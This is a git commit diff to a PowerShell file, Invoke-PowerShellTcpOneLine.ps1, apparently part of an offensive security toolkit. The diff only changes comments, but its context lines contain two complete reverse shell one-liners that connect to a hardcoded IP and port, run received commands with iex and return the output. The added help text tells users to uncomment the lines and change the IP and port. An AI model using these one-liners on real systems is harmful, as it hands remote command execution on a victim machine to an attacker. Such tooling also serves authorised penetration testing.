9e7e581641db8d1ac0a06390a13176be704275cc
Nikhil "SamratAshok" Mittal <nikhil.uitrgpv@gmail.com>
2015-11-28 12:28:07 +0530

    Minor changes to help of couple of Shells

--- Shells/Invoke-PowerShellTcpOneLine.ps1
+++ Shells/Invoke-PowerShellTcpOneLine.ps1
@@ -1,5 +1,5 @@
-﻿
+﻿#Uncomment and change the hardcoded IP address and port number in the below line. Remove this help comment as well.
 #$client = New-Object System.Net.Sockets.TCPClient("192.168.254.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-#Two Tweets
+#Even smaller reverse shell. Could fit in Two Tweets.
 #$sm=(New-Object Net.Sockets.TCPClient("192.168.254.1",55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
